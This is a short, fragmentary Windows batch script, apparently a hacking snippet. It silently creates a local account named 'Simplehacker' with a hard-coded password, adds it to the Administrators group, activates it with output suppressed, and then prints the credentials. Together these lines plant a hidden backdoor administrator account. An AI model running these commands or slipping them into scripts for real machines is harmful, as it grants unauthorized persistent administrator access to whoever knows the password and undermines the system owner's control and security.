...
net user Simplehacker @#Simple@ /add >nul
net localgroup administrators Simplehacker /add >nul
net user Simplehacker /active:yes >nul
...
echo Username: Simplehacker
echo Password: @#Simple@
